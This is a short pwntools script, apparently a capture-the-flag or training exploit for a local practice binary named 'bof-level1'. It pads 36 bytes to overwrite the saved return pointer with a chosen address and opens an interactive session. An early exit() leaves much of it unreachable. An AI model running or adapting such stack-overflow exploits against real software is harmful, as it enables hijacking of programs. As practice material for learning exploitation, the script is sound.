from pwn import	*

# stack offset to overwrite rip
stack_offset = 36

buffer = "A"*stack_offset + p64(0x08048500)

print buffer
exit()

# run target
p = process("./bof-level1")

# wait for debugger
pid = util.proc.pidof(p)[0]
print "The pid is: "+str(pid)
util.proc.wait_for_debugger(pid)

buffer = "A"*stack_offset + p64(0xdeadbeef)

print buffer

# process interaction
p.recvuntil("Type YES if you agree with this... (a fake message)")
p.sendline(buffer)

p.interactive()

